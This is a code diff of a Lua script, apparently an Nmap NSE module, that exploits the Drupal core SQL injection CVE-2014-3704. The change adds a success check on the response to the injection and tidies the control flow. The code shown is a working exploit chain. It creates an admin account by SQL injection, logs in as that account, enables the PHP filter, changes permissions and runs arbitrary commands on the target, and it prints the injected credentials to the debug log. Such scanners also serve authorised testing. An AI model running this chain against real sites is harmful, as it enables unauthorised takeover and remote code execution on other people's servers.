@@ -216,9 +216,14 @@ local function do_sql_query(host, port, uri, user)
     }
   }
   local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
-  --TODO: Check return status
 
-  return user, passwd
+  if string.match( res.body, 'mb_strlen() expects parameter 1 to be string' ) then
+    return user, passwd
+  else
+    -- Either the website isn't vulnerable, or your Internet isn't working.
+    return nil, nil
+  end
+
 end
 
 local function set_php_filter(host, port, uri, session, disable)
@@ -344,73 +349,75 @@ action = function(host, port)
 
   local user, passwd = do_sql_query(host, port, uri, nil)
 
-  stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
-  local data = {
-    ['name'] = user,
-    ['pass'] = passwd,
-    ['form_id'] = 'user_login',
-    ['op'] = 'Log in',
-  }
-
-  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
-
-  if res.status == 302 and res.cookies[1].name ~= nil then
-    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
-    local vuln = {
-      title = 'Drupal - pre Auth SQL Injection Vulnerability',
-      state = vulns.STATE.NOT_VULN,
-      description = [[
-The expandArguments function in the database abstraction API in
-Drupal core 7.x before 7.32 does not properly construct prepared
-statements, which allows remote attackers to conduct SQL injection
-attacks via an array containing crafted keys.
-      ]],
-      IDS = {CVE = 'CVE-2014-3704'},
-      references = {
-        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
-        'https://www.drupal.org/SA-CORE-2014-005',
-        'http://www.securityfocus.com/bid/70595',
-      },
-      dates = {
-        disclosure = {year = '2014', month = '10', day = '15'},
-      },
+  if user ~= nil and passwd ~= nil then
+    stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
+    local data = {
+      ['name'] = user,
+      ['pass'] = passwd,
+      ['form_id'] = 'user_login',
+      ['op'] = 'Log in',
     }
-    stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
-    vuln.state = vulns.STATE.EXPLOIT
 
-    if cmd ~= nil then
-      local session = {}
-      session.name = res.cookies[1].name
-      session.value = res.cookies[1].value
+    local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
 
-      set_php_filter(host, port, uri, session, false)
+    if res.status == 302 and res.cookies[1].name ~= nil then
+      local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
+      local vuln = {
+        title = 'Drupal - pre Auth SQL Injection Vulnerability',
+        state = vulns.STATE.NOT_VULN,
+        description = [[
+        The expandArguments function in the database abstraction API in
+        Drupal core 7.x before 7.32 does not properly construct prepared
+        statements, which allows remote attackers to conduct SQL injection
+        attacks via an array containing crafted keys.
+        ]],
+        IDS = {CVE = 'CVE-2014-3704'},
+        references = {
+          'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
+          'https://www.drupal.org/SA-CORE-2014-005',
+          'http://www.securityfocus.com/bid/70595',
+        },
+        dates = {
+          disclosure = {year = '2014', month = '10', day = '15'},
+        },
+      }
+      stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
+      vuln.state = vulns.STATE.EXPLOIT
 
-      set_permission(host, port, uri, session, false)
+      if cmd ~= nil then
+        local session = {}
+        session.name = res.cookies[1].name
+        session.value = res.cookies[1].value
 
-      local resp_content, pattern = trigger_exploit(host, port, uri, session, cmd)
+        set_php_filter(host, port, uri, session, false)
 
-      local cmdOut = nil
-      for m in string.gmatch(resp_content, pattern .. '([^"]*)' .. pattern) do
-        cmdOut = m
-        break
+        set_permission(host, port, uri, session, false)
+
+        local resp_content, pattern = trigger_exploit(host, port, uri, session, cmd)
+
+        local cmdOut = nil
+        for m in string.gmatch(resp_content, pattern .. '([^"]*)' .. pattern) do
+          cmdOut = m
+          break
+        end
+
+        if cmdOut ~= nil then
+          vuln.exploit_results = cmdOut
+        end
+
+        -- cleanup: restore permission & disable php filter module
+        if cleanup == nil then
+          set_permission(host, port, uri, session, true)
+          set_php_filter(host, port, uri, session, true)
+        end
       end
 
-      if cmdOut ~= nil then
-        vuln.exploit_results = cmdOut
-      end
-
-      -- cleanup: restore permission & disable php filter module
+      -- cleanup: remove admin user
       if cleanup == nil then
-        set_permission(host, port, uri, session, true)
-        set_php_filter(host, port, uri, session, true)
+        do_sql_query(host, port, uri, user)
       end
-    end
 
-    -- cleanup: remove admin user
-    if cleanup == nil then
-      do_sql_query(host, port, uri, user)
+      return vulnReport:make_output(vuln)
     end
-
-    return vulnReport:make_output(vuln)
   end
 end
